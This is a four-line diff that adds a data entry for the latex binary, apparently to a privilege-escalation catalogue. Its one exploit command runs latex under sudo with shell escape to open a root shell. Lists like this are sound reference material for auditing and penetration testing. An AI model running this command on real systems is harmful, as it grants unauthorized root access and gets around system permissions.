@@ -1,0 +1,4 @@
+name: latex
+binary_path: /usr/bin/latex
+exploit_cmds:
+- sudo /usr/bin/latex --shell-escape '\immediate\write18{/bin/sh}'
